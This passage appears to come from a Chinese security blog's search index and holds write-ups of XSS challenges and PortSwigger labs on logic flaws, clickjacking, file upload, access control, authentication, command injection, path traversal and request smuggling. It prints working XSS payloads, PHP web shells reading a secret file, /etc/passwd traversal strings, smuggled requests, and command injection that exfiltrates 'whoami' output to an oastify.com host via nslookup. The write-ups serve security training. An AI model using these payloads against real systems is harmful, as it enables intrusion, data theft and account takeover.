&lt;img src=”1” onerror=alert(‘xss’)&gt; &lt;img%0asrc=1%0aonerror=alert(1)&gt; &lt;img src=”1” onerror=alert(‘xss’) &gt; URL 解码 插入 XSS level 17 在 URL 中填上参数?arg01=1111&amp;arg02=2222，然后查看页面源代码，发现有个 embed 标签，填入的参数在 src 属性中进行了拼接 &lt;embed&gt;标签就是引入一个swf文件【SWF格式是动画软件Flash的专用格式】 &lt;!-- 查看页面源代码 --&gt; &lt;embed src=xsf01.swf?1111=2222 width=100% heigth=100%&gt;&lt;h2 align=center&gt; ?arg01= onclick&amp;arg02=alert(‘xss’) // ' &gt; onmouseover=alert(1) 火狐、Chrom、Edge 等浏览器已不支持 flash，所以不会弹窗 level 18 和 level 17 是一样的 level 19、20 IE 浏览器和 flash 均已被历史淘汰","tags":["XSS"],"categories":["网络安全"]},{"title":"XSS Challenges","path":"/2023/02/13/XSS Challenges/","content":"XSS 挑战 （由 yamagata21） - 阶段 #1 (int21h.jp) 题目要求注入 JavaScript 命令： alert(document.domain); Stage #1 输入321来定位代码的位置，发现是处于&lt;b&gt;&lt;/b&gt;标签之内，没有任何过滤 // 第一种方法是闭合 b 标签，插入 Script 标签 &quot;&lt;/b&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;// // 第二种方法是直接在 b 标签内部构造 XSS &lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 闭合 b 标签的方式 直接在 b 标签内部构造 XSS Stage #2 输入321来定位代码的位置，发现注入点在input标签的value属性里面 // 第一种方法是闭合 input 标签，插入 Script 标签 &quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;// // 第二种方法是在 input 标签中插入属性 // onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码 123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 闭合 input 标签，插入 Script 标签 input 标签中插入属性 Stage #3 输入321来定位代码的位置，发现注入点在b标签，于是乎使用 stage1 的 payload，结果失败了 失败原因，用于构造标签的&lt;&gt;和&quot;被转义了 &lt;&gt; --&gt; &amp;lt;&amp;gt; &quot; --&gt; &amp;quot; 通过查看源代码发现有两个参数，P1 是文本输入，P2 是下拉列表，因为 P1 有过滤，所以对 P2 进行注入 用 burp 截取数据包，篡改 P2 的值，Forward 放包之后会发现弹出 // burp 中对 P2 参数进行注入， p1=123&amp;p2=&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 两个参数 Stage #4 输入321来定位代码的位置，发现注入点还是在b标签，但是用 burp 抓包后发现了三个参数，P1、P2、P3 从源代码中搜索 P3 的值 hackme，发现是在一个 input 标签的 value 属性中，且type=&quot;hidden&quot;，这说明该 input 元素在网页页面是不可见的，换言之网页上面不显示输入框，做了隐藏处理。 // 用 burp 截取数据包，然后对 P3 参数进行篡改，用 &quot;&gt; 闭合 input 标签，插入 Script 标签 &quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; 定位位置 查询 P3 的值 在 burp 中修改 P3 的值然后放包 P3 参数处注入 Stage #5 输入321来定位代码的位置，发现注入点在input标签的value属性里面 但与 Stage #2 不同的是 input 标签中加入了maxlength 属性，其值为15，意思是输入的字符不能超过 15。 maxlength 属性规定 元素中允许的最大字符数。 像是这中前端的设置是可以在源代码中进行修改，进而绕过限制 然后把maxlength的值设置为100，接着就是 Stage #2 的步骤 // 第一种方法是闭合 input 标签，插入 Script 标签 &quot;&gt; &lt;script&gt;alert(document.domain)&lt;/script&gt;// // 第二种方法是在 input 标签中插入属性 // onmouseover 事件 --&gt; 鼠标指针移动到图片后执行Javascript代码 123&quot; onmouseover=alert(document.domain)&gt;// 定位位置 修改 maxlength 的值 成功弹窗 Stage #6 输入321来定位代码的位置，发现注入点还是在input标签的value属性中 于是用 Stage #2 闭合input 的方式来构造 XSS，测试后发现过滤了&lt;&gt;，但没有过滤&quot;， 这说明不可以用新标签，只能在input标签内通过&quot;闭合前面的属性的方式，为后面新增属性 &gt; --&gt; &amp;gt; HTML 事件 | 菜鸟教程 (runoob.com) // 需要点击搜索框触发， &quot; onclick=alert(document.domain) // 需要移动到搜索框触发 &quot; onmouseover=alert(document.domain) 查看过滤情况 鼠标事件 Stage #7 注入点还是在input标签的value属性中，但依旧是过滤了&lt;&gt;和&quot; &quot; onmouseover=alert(document.domain) // 321 会写入 input 的 value 值中，空格做个分隔，写后面的属性 321 οnmοuseοver=alert(document.domain) 321 onclick=alert(document.domain) 查看过滤 用点击事件 Stage #8 输入字符发现注入点在a标签的href属性中，随即想到JavaScript 伪协议绕过（需要点一下链接才能弹窗） // javascript 伪协议 // &lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL，href 属性的值可以是 JavaScript 表达式 javascript:alert(document.domain); 定位 JavaScript 伪协议 Stage #9 听说开发者是日本人，难怪会有这种题目 通过 burp 抓包发现参数是charset=euc-jp，亦即日文编码，需要识别 UTF-7 的 IE 浏览器（但 IE 已经退役了……） 看了其他人的方法，在控制台输出弹窗绕过 Stage #10 定位在input标签的value属性中，但domain过滤了，可以使用嵌套绕过的方式 // 嵌套绕过 &quot;&gt;&lt;script&gt;alert(document.domadomainin)&lt;/script&gt; // 看其他人有用 base 64 编码的方式来绕过的，但是需要解密函数 atob() 对字符串进行解密再进行执行 // eval()函数计算 JavaScript 字符串，并把它作为脚本代码来执行 alert(document.domain) 经过 base 64 编码后，YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ== &quot;&gt;&lt;script&gt;eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));&lt;/script&gt; 嵌套 Stage #11 从此关开始打不开了","tags":["XSS"],"categories":["网络安全"]},{"title":"Google XSS Game","path":"/2023/02/11/Google XSS Game/","content":"XSS game (xss-game.appspot.com) 这是一款谷歌的 XSS 游戏，总共有 6 个级别 Level 1 无需转义，直接编辑 URL 栏或者搜索框中都可以执行 &lt;script&gt;alert(1)&lt;/script&gt; Level 2 留言板中放入&lt;script&gt;alert(1)&lt;/script&gt;发现不弹窗，说明&lt;script&gt; 标签不起作用，转译成了HTML实体，可以选择其他能够触发 JavaScript 代码的命令 // 标签与属性一起使用，onerror 事件会在文档或图像加载过程中发生错误时被触发。 &lt;img src='#' onerror=alert(1) /&gt; Level 3 // 查看源代码 function chooseTab(num) &#123; // Dynamically load the appropriate image. var html = &quot;Image &quot; + parseInt(num) + &quot;&lt;br&gt;&quot;; html += &quot;&lt;img src='/static/level3/cloud&quot; + num + &quot;.jpg' /&gt;&quot;; $('#tabContent').html(html); // 用 ' 闭合 src 属性，用 /&gt; 闭合 img 标签 ' onerror='alert(1)'/&gt; Level 4 // 闭合 startTimer() 函数，用 , 连接写入 alert() 方法 // onload 事件在图片加载完成后立即执行 100'),alert('1 Level 5 // 这是基于 DOM 的 XSS，在邮件中插入 javascript:alert(1) // 插入后 &lt;a href=&quot;javascript:alert(1)&quot;&gt; Level 6 Data URL - HTTP | MDN (mozilla.org) 在浏览器中，有一些用于访问资源或脚本的协议，称作伪协议 data 伪协议 // Data URL，允许内容创建者向文档中嵌入小文件 data:text/javascript,alert(1)","tags":["XSS"],"categories":["网络安全"]},{"title":"Portswigger 靶场之“业务逻辑漏洞","path":"/2022/12/22/business-logic-flaws/","content":"All labs | Web Security Academy (portswigger.net) Business logic vulnerabilities 1. Excessive trust in client-side controls 过度信任客户端控制 登录wiener:peter，购买Lightweight &quot;l33t&quot; Leather Jacket，价格是$1337.00，下单后显示商店积分不够，不可以购买 在 Burp 中，截断Add to cart功能，修改价格（price）为1以满足商店的信用额度，完成订单以解决实验室。 2. High-level logic vulnerability 高级逻辑漏洞 登录wiener:peter，把Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车，通过用 burp 抓包，发现价格参数price没有了，剩下了数量参数quantity。 尝试去修改数量参数quantity为-1，果不其然，成功修改，但下单后不被允许金额小于零，无法下单。 于是通过叠加商品，既满足Store credit（店铺积分）100元之内，又满足下单金额是大于零的要求 依旧是把一个Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车；再购买The Giant Enter Key（巨型回车键），数量用1337/25.35=52.74来计算 3. Inconsistent security controls 不一致的安全控制 在 Burp Suite 中，使用 Site map（站点地图）功能，来查看站点目录，发现路径admin。访问/admin，页面回显需要“DontWannaCry ”用户登录才可访问 页面右上角Register 注册一个账号，其中邮箱需要点击页面上方的Email client获得，注册后会发来一封邮件点击验证一下，然后登录账户，紧随其后修改邮箱为 @DontWannaCry.com 这时候就可以访问管理面板了，删除用户即可 4. Flawed enforcement of business rules 有缺陷的业务规则执行 注意到页面有一个优惠券代码——NEWCUST5，页面底部可通过注册获得优惠券代码SIGNUP30 添加商品到购物车，尝试优惠券的使用，发现连续两次输入相同的代码，不被允许，而交替使用可绕过，就一直叠加 5. Low-level logic flaw 低级逻辑缺陷 登录账号，购买商品的数量一次最多可以 +99，可以用 Burp 的 intruder 送到 Overflow Quote / 参考 int overflow（整数溢出）是指在计算机中，对一个整数类型（例如 int、long 等）进行计算时，结果超出了该类型可以表示的最大值（或最小值），导致结果不正确的情况。 在计算机中，整数类型的表示是有限的，即它们可以表示的范围是有限的。例如，一个 32 位的有符号整数类型 int 可以表示从 -2,147,483,648 到 2,147,483,647 的整数，如果在计算时得到的结果超过了这个范围，就会发生整数溢出。 6. Inconsistent handling of exceptional input 异常输入的不一致处理 需要进入/admin目录，删除 Carlos。 首先注册一个用户，验证用户，返回该用户的时候发现并没有修改邮箱的选项。 于是在注册页面修改邮箱，利用长度截断（256个字符）使得注册的邮箱地址为@dontwannacry.com。注册完验证后登录账户以便删除 Carlos。 bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb@dontwannacry.com.0a0800c503176684c4ae681001ba00e2.web-security-academy.net 7. Weak isolation on dual-use endpoint 两用端点上的弱隔离 登录 wiener 用户后，在修改密码的界面发现，可以修改任意“用户”的密码，但需要输入当前密码（当前密码未知），通过 burp 截断数据包分析得知，当前密码是可以删除来绕过此限制的。 8. Insufficient workflow validation 工作流程验证不足 登录账号，购买一个2.04的商品（少于商店积分 100），观察代理历史记录，注意到下订单时，POST 请求会重定向到订单确认页面 添加1337 的那款商品，下单观察代理历史记录，研究两者之间的差异，注意到2.04的商品 GET 请求为GET /cart/order-confirmation?order-confirmation=true即可购买成功，把1337 的商品进行修改也可绕过限制 9. Authentication bypass via flawed state machine 通过有缺陷的状态机绕过身份验证 用 burp 拦截登录请求，Forward POST 请求，Drop Redirect，然后直接访问/admin 登录的请求有两个，第一个是 POST 请求，第二个是重定向 GET 请求，作用是选择角色转到主页，将第二个包丢弃可默认为该角色，即可访问管理面板 10. Infinite money logic flaw 无限金钱逻辑缺陷 home 页底部注册得到 SIGNUP30，可以购买 10 美元的礼品卡并从“my-account”页面兑换，兑换的过程中注意到商店信用增加了（用 Burp 或者 Python 自动执行此过程） 攻击完成后，商店的总体信用额度将提升足以购买“皮夹克” 11. Authentication bypass via encryption oracle 通过加密 oracle 绕过身份验证 登录后有一个 Stay Logged in（保持登录状态）的功能，且是加密后的 未完……","tags":["靶场","逻辑漏洞"],"categories":["网络安全"]},{"title":"portswigger 靶场之点击劫持（Clickjacking）","path":"/2022/12/11/clickjacking/","content":"All labs | Web Security Academy — 所有实验室 |网络安全学院 (portswigger.net) 1. Basic clickjacking with CSRF token protection 具有 CSRF 令牌保护的基本点击劫持 目标： 制作一些 HTML 来构建帐户页面并欺骗用户删除他们的帐户 过程： 先登录账号，登录后界面上有个选项为Delete account，即删除账户。 页面上方有个Go to exploit server去利用服务器，点进去，在Body中写入HTML代码并用CSS来绝对定位选项Delete account的位置。 设置透明度opacity使得攻击者看不到真实的界面，Delete account选项被隐藏在&lt;div&gt;Click Me&lt;/div&gt;之下 Quote / 参考 在点击劫持攻击中，攻击者会将一个透明的iframe覆盖在目标网站的页面上，然后诱使受害者在该iframe中点击某些看似无害的按钮或链接，实际上却是在执行攻击者的恶意操作 攻击者使用iframe的目的是为了掩盖受害者的真实行为。因为iframe可以嵌入其他网站或页面，攻击者可以在iframe中展示一个看似无害的页面或按钮，但实际上它们可能会触发跨站点请求，执行攻击者的恶意操作。 &lt;style&gt; iframe &#123; position:relative; width:1000px; height: 700px; opacity: 0.0000001; z-index: 2; &#125; div &#123; position:absolute; top:515px; left:60px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Click Me&lt;/div&gt; &lt;iframe src=&quot;https://0a37007803673341c044c7f400150047.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt; 2. Clickjacking with form input data prefilled from a URL parameter 使用从 URL 参数预填充的表单输入数据进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 登录账号，转到服务器界面，这一关，主要是通过 GET 参数的方式预填充表单，即在 URL 上添加了修改的邮箱 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.00; z-index: 2; &#125; div &#123; position:absolute; top:450px; left:80px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Test me&lt;/div&gt; &lt;iframe src=&quot;https://0a3800d603ebc15ac0aa4aa0002c0090.web-security-academy.net/my-account?email=111@123.com&quot;&gt;&lt;/iframe&gt; 3. Clickjacking with a frame buster script 使用 frame buster 脚本进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 先登录账号，然后到服务器界面，这一关运用了sandbox 属性，限制 iframe 嵌套，使其失效。 可通过在iframe标签中设置sandbox=&quot;allow-forms&quot;来绕过限制 Quote / 参考 &quot;Frame buster&quot; 技术使用 JavaScript 代码来检测页面是否被嵌套在框架中 在 HTML 中，sandbox=&quot;allow-forms&quot; 是一种设置 iframe（内嵌框架）安全性的方法之一。该属性指定在 iframe 中是否允许表单提交。 当 sandbox 属性的值为 allow-forms 时，表示在 iframe 中允许表单提交，但不允许执行其他一些操作，如运行脚本、显示弹出窗口等。 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; div &#123; position:absolute; top:450px; left:80px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Click me&lt;/div&gt; &lt;iframe sandbox=&quot;allow-forms&quot; src=&quot;https://0a0e00d50460a332c236f332009c00c0.web-security-academy.net/my-account/?email=hacker@attacker-website.com&quot;&gt;&lt;/iframe&gt; 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS 利用点击劫持漏洞触发基于 DOM 的 XSS 目标： 欺骗用户单击“单击我”按钮来调用函数。print() 过程： 先登录账号，然后到服务器界面，这一关在 iframe 的点击劫持中附加了 DOM XSS。 通过 name 输入框，放入 JavaScript 脚本&lt;img src=1 onerror=print()&gt;，因为这个 img 标签的 src 属性的值是 1，所以这个图片肯定是不存在的，因此会触发 onerror 事件，并且执行 print() 函数。print() 是 JavaScript 的内置函数，能够在弹窗中输出内容。 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; div &#123; position:absolute; top:620px; left:40px; z-index: 1; &#125; &lt;/style&gt; &lt;div&gt;Click me&lt;/div&gt; &lt;iframe src=&quot;https://0a2a00e403c20784c0166d6a00c800b2.web-security-academy.net/feedback/?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult&quot;&gt;&lt;/iframe&gt; 5. Multistep clickjacking 多步点击劫持 目标： 诱骗用户单击删除帐户按钮和确认对话框 过程： 需要执行两个步骤，删除用户 --&gt; 确认删除，所以设置两个点击按钮 &lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; .firstClick, .secondClick &#123; position:absolute; top:510px; left:50px; z-index: 1; &#125; .secondClick &#123; top:285px; left:225px; &#125; &lt;/style&gt; &lt;div class=&quot;firstClick&quot;&gt;Click me first&lt;/div&gt; &lt;div class=&quot;secondClick&quot;&gt;Click Store&lt;/div&gt; &lt;iframe src=&quot;https://0a9a0010038a45ffc436c9d000f50019.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;","tags":["靶场","点击劫持"],"categories":["网络安全"]},{"title":"Portswigger 靶场之“文件上传”","path":"/2022/11/11/file-upload/","content":"File upload vulnerabilities All labs | Web Security Academy (portswigger.net) 1. Remote code execution via web shell upload 通过 Web shell 上传远程执行代码 目标：读取/home/carlos/secret文件的内容 过程 登录用户，选择一个图片上传。用 burp 分别拦截“上传文件”和“查看文件”的数据包，一个 POST 请求，另一个是 GET 请求 在 burp 上传文件中文件名后缀改为.php，删除原来图片的内容，替换为 php webshell，并且上传 在*查看文件*数据包中，访问上传的 webshell；或者回到浏览器，先刷新页面，后右键图片在新标签页打开 # PHP 的读取代码 &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt; # file_get_contents() 把整个文件读入一个字符串中。 2. Web shell upload via Content-Type restriction bypass 通过 Content-Type 限制绕过 Web shell 上传 先登录，上传图片，在 burp 的 http history 中拦截“上传文件”和“查看文件”的数据包，并转发到 Repeater，重命名为Upload File Show File以便更好地观察 在 burp 上传文件中，修改名称、删除图片内容替换为 php webshell，最重要的一点是将Content-Type 修改为image/jpeg 后续步骤如法炮制而来 &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt; 3. Web shell upload via path traversal Web Shell 通过路径遍历上传 传入 webshell 后&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;，访问文件的时候**显示了未经解析的源代码，由此想到该目录没有执行权限，需要上传到其他目录，进行目录遍历** 在 burp 上传数据包，将文件名改为../文件名，需要经过 URL 编码，编码后是..%2f文件名，文件将被上传到“上一层”文件夹 4. Web shell upload via extension blacklist bypass Web Shell上传通过扩展黑名单绕过 按照往常一样上传 PHP webshell，服务器回答说“不允许”上传 PHP 文件。从响应中，注意到正在运行的服务器是 Apache， .htaccess文件是 Apache 服务器的一个配置文件，负责相关目录下的网页配置。能够实现*改变文件扩展名、允许/阻止特定的用户或者目录的访问* 可以欺骗 Apache 服务器将任意*自定义文件扩展名*映射到可执行的 MIME 类型。 第一步、修改.htaccess文件 # 修改名称 .htaccess # 修改 Content-Type text/plain # 修改内容 AddType application/x-httpd-php .shell 实现的功能就是：所有上传的.shell文件都会被当作php文件执行 接着上传一个后缀名为shell的文件，完成实验室任务 # 修改名称 code.shell # 修改 Content-Type image、png # 修改内容 &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt; 5. Web shell upload via obfuscated file extension 通过混淆文件扩展名上传 Web Shell 利用%00 截断 文件名用 Burp 改 code.php%00.png、 在 url 中 %00 表示 ascll 码中的 0 ，而 ascii 中 0 作为特殊字符保留，表示字符串结束，所以当 url 中出现 %00 时就会认为读取已结束 当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃 6. Remote code execution via polyglot web shell upload 通过多语言 web shell 上传远程代码执行 服务器可能通过图像的字节序列来判断是否是jpeg、png文件等；使用 ExifTool 创建包含元数据中恶意代码的多语言 JPEG 文件 在 kali 中安装 ExifTool apt install libimage-exiftool-perl 利用 ExifTool exiftool -Comment=&quot;&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;&quot; code.jpg -o code.php 7. Web shell upload via race condition 通过竞争条件上传 Web shell 通过 Race Condition，上传的 webshell 文件会先存到一个文件夹中，然后才会确认是否合法，如果不合法再删掉。文件被删除之前这段间隙去突破","tags":["文件上传","靶场"],"categories":["网络安全"]},{"title":"Portswigger 靶场之“访问控制漏洞”","path":"/2022/10/07/access-control/","content":"Access control vulnerabilities All labs | Web Security Academy (portswigger.net) 1. Unprotected admin functionality 不受保护的管理功能 没有限制的 admin 面板，进去删帐号robots.txt /administrator-panel 2. Unprotected admin functionality with unpredictable URL 具有不可预测的 URL 的未受保护的管理功能 Ctrl + U 打开页面源代码，通过 Ctrl + F 搜索admin字符并观察 3. User role controlled by request parameter 由请求参数控制的用户角色 这一关的要点在于修改 Cookie，登录帐号后会发现有一个 cookie 值是 Admin false ，改为true，再访问 /admin，就会发现删除界面 4. User role can be modified in user profile 可以在用户配置文件中修改用户角色 更新邮件的地方是 JSON 数据，可以往里面多塞一些东西，然后浏览 /admin 界面删除用户 5. User ID controlled by request parameter 由请求参数控制的用户 ID 登录账户后抓包继而发现存在参数 ?id=wiener，替代为 carlos 从而获取 carlos 用户的 API 6. User ID controlled by request parameter, with unpredictable user IDs 用户 ID 由请求参数控制，用户 ID 不可预测 从博客文章中找到 carlos，用 burp 拦截，复制 ID 登录账户，用 burp 将 carlos 的 ID 写入请求 7. User ID controlled by request parameter with data leakage in redirect 用户 ID 由请求参数控制，重定向中存在数据泄漏 API KEY 在redirect（重定向） 的response（响应）中 8. User ID controlled by request parameter with password disclosure 用户 ID 由具有密码泄露的请求参数控制 修改 ID 后，F12 选到 Password 的地方，就可以看到密码 9. Insecure direct object references 不安全的直接对象引用 环顾四周，发现右上角有个Live chat，实时聊天室 和机器人对话并点击View transcript会把刚和机器人聊天的内容下载到一个txt文本文档中。 把URL改为download-transcript/1.txt即可得到密码 10. URL-based access control can be circumvented 可以规避基于 URL 的访问控制 先访问 admin，失败，继而进行抓包，添加X-Original-URL: /invalid成功，后面如法炮制 11. Method-based access control can be circumvented 可以规避基于方法的访问控制 先登录管理员账户，升级 carlos 的同时抓包，发送到 Repeater 在隐私浏览器窗口，登录wiener:peter，将 Cookie 复制到 Repeater 中，并且右键单机Change request method将请求方法改为 GET，用户名参数由 Carlos 改为 wiener 12. Multi-step process with no access control on one step 多步骤过程，一步没有访问控制 登录 Admin 帐号和 wiener 帐号 wiener 帐号抓到 Cookie 值复制带到 Repeater 中…… 13. PRACTITIONER Referer-based access control 基于引用的访问控制","tags":["靶场","访问控制"],"categories":["网络安全"]},{"title":"PortSwigger 之“身份认证”","path":"/2022/09/25/authentication/","content":"https://portswigger.net/web-security/all-labs#authentication Authentication 1. 通过不同的响应进行用户名枚举 在登录页面填入账号密码通过 burp 抓包，发送到 Intruder 模块，枚举用户名，观察 length 的不一致来找到用户名，紧接着枚举密码…… 2. 2FA简单旁路 攻击者登录账号wiener:peter并接收邮箱验证码，在我的账户页面，填入验证码后复制 URL 地址（目的是模拟用户访问自己的账户），紧接着注销帐户。 登录受害者账号carlos:montoya，在接收邮箱验证码页面，修改地址栏中的URL 地址 3. 密码重置损坏的逻辑 这一关主要是利用密码重置，跳过令牌检查来修改密码，从而获取系统的访问权限 解题步骤： 在网站中忘记密码，填入 wiener，在电子邮件发出的链接中重置密码。 将“密码重置功能“发送到 Repeater，观察请求和响应，发现 token 是无效的，将用户名 wiener 修改为 carlos 后可成功修改 carlos 用户的密码 4. 通过细微不同的响应进行用户名枚举","tags":["靶场","身份认证"],"categories":["网络安全"]},{"title":"Portswigger 靶场 | 操作系统命令注入","path":"/2022/09/15/os-command-injection/","content":"OS command injection All labs | Web Security Academy (portswigger.net) 常见注入方式 分号分割 || &amp;&amp; &amp; 分割 | 管道符 \\r %d0%a0 换行 反引号解析 $() 替换 1. OS command injection, simple case OS命令注入，简单案例 **目标：**执行命令以确定当前用户的名称。whoami 过程： 用 burp 拦截数据包，有两个参数分别是产品和商店 Post 设置参数，whoami 命令用于显示自身用户名称 1 &amp; whoami # URL 编码后 1+%26+whoami+%23 2. Blind OS command injection with time delays 具有时间延迟的盲操作系统命令注入 **目标：**通过 sleep 10 秒判断出问题所在 过程： 在“反馈”界面抓包处理，分别测试name email等参数 +%26+sleep+10+%23 &amp; sleep 10 # 3. Blind OS command injection with output redirection 带有输出重定向的盲操作系统命令注入 **目标：**通过 whomi 命令，输出重定向到/var/www/images/ 过程： 在“反馈”界面抓包处理，分别测试name email等参数 让应用程序在输出响应之前休眠 10 秒，来确认是否有盲注命令注入，测试后发现易受攻击的字段是email 可通过 F12 把 emali 的 type 改为 text，以此绕过前端检查，来提交反馈 在电子邮箱处填写&amp; whoami &gt; /var/www/images/ling.txt #，执行 whoami 命令，将内容保存在 ling.txt 访问图片网址，修改文件名成 ling.txt # 等待十秒 &amp; sleep 10 # # 将内容保存在 ling.txt &amp; whoami &gt; /var/www/images/ling.txt # # 访问 https://0ab8007b0415044bc48b9b5d001e00fb.web-security-academy.net/image?filename=ling.txt 4. Blind OS command injection with out-of-band interaction 带有带外交互的盲操作系统命令注入 **目标：**利用盲操作系统命令注入漏洞向 Burp 协作者发出 DNS 查找 过程： 需要 Burp pro 而不是社区版，利用 nslookup 命令去外带出回显 nslookup 命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题 +%26+nslookup+bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com+%23 # URL 解码后 &amp; nslookup bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com # 5. Blind OS command injection with out-of-band data exfiltration 带外数据泄露的盲 OS 命令注入 启用 Burp Collaborator client，复制到剪贴板；拦截和修改提交反馈的请求，修改 email 参数 &amp; nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # &amp; nslookup $(whoami).kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # ||nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com|| 最后，在 burp 的子域名中，可以看到 DNS 交互，获得当前用户名 0","tags":["靶场","命令注入"],"categories":["网络安全"]},{"title":"portswigger 靶场之目录遍历","path":"/2022/08/05/directory-traversal/","content":"所有实验室 |网络安全学院 (portswigger.net) Directory traversal 1. 文件路径遍历，简单案例 File path traversal, simple case 使用 Burp Suite 截获和修改获取产品图像的请求。 修改参数filename，观察响应是否包含文件的内容。/etc/passwd ../../../etc/passwd # 相对路径 “../&quot;，这个路径表示回到上一级目录 访问操作系统中的 passwd 文件。passwd 文件包含系统中所有用户的用户名、密码、用户 ID、主目录等信息 2. 文件路径遍历，通过绝对路径旁路阻止遍历序列 File path traversal, traversal sequences blocked with absolute path bypass 使用 Burp Suite 修改产品图像的请求filename /etc/passwd 当接收到用户提供的路径时，应用程序首先将其解析为绝对路径，然后将其与白名单中的路径进行比较。防止攻击者使用目录遍历序列来访问应用程序之外的文件和目录。 如果路径在白名单内，则认为是合法的； 否则，应用程序会拒绝该请求并返回错误信息。 3. 文件路径遍历，非递归剥离遍历序列 File path traversal, traversal sequences stripped non-recursively 非递归剥离遍历序列：应用程序会解析路径并对其进行分析，然后使用算法来**删除路径中的 “…/” 遍历序列** 使用双写绕过 ....//....//....//etc/passwd 4. 文件路径遍历，使用多余的 URL 解码剥离遍历序列 File path traversal, traversal sequences stripped with superfluous URL-decode 第四关/被过滤了，所以需要对其进行 URL 编码，但在 burp 中用 Repeater 发送后还是错误，得知需要进行第二次 URL 编码才可绕过 ..%252f..%252f..%252fetc/passwd 5. 文件路径遍历，路径开始验证 File path traversal, validation of start of path 验证请求的文件路径是否以 “/var/www/” 开头 /var/www/images/../../../etc/passwd 6. 文件路径遍历，使用空字节旁路验证文件扩展名 File path traversal, validation of file extension with null byte bypass 在 URL 编码中，%00 可以用于表示字符串的结束符。 作用是将“.png”文件名截断，使得请求实际上是针对“/etc/passwd”这个文件的 ../../../etc/passwd%00.png","tags":["靶场","目录遍历"],"categories":["网络安全"]},{"title":"PortSwigger 靶场之 HTTP 请求走私","path":"/2022/07/15/http-request-smuggling/","content":"All labs | Web Security Academy (portswigger.net) HTTP request smuggling 1. HTTP request smuggling, basic CL.TE vulnerability HTTP 请求走私，基本的 CL.TE 漏洞 当 Content-Length 和 Transfer-Encoding 同时出现时，客户端应该遵循 Transfer-Encoding 的规则，而忽略 Content-Length，因为 Transfer-Encoding 机制会将消息体进行拆分 这关主要是通过更改 Content-Length 的值，发送带有 Transfer-Encoding 头部的正文来达到欺骗服务器的目的 POST / HTTP/1.1 Host: 0a06001d03118aa0c4626eb800680067.web-security-academy.net Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G 2. HTTP request smuggling, basic TE.CL vulnerability HTTP 请求走私，基本的 TE.CL 漏洞 和第一关的区别是，这一关更改 Transfer-Encoding 的值，然后通过发送带有 Content-Length 的正文来欺骗服务器 声明了 Content-length 为 4，但随后使用了 Transfer-Encoding: chunked，这意味着请求体被分成多个部分（即块），每个块都包含一个十六进制的数字，表示该块的大小。第一个块的大小为 5c（十六进制，等于 92），所以后面的块包含了 92 个字符。 但是由于存在 TE.CL 漏洞，**服务器会忽略 Content-length，因此不会将前面的 4 个字符视为请求体的一部分。**相反，服务器会将第一个块的大小视为整个请求体的大小，从而导致攻击者可以向服务器发送包含恶意内容的块，这些内容被认为是请求体的一部分，但实际上并不包含在 Content-length 中声明的大小范围内。 POST / HTTP/1.1 Host: 0a83009b049ca08ec342d8a2002f0070.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 3. HTTP request smuggling, obfuscating the TE header HTTP 请求走私，混淆 TE 标头 在请求中添加多个 Transfer-Encoding 头部来混淆或欺骗服务器。在这关中出现了两个 Transfer-Encoding 字段，一个值为 “chunked”，另一个值为 “cow”。 请求体的内容是经过编码的，其中包括了一个 GPOST 请求以及一个包含参数 x=1 的请求体。 POST / HTTP/1.1 Host: 0a5200a4048704c8c3857a68009c004f.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: 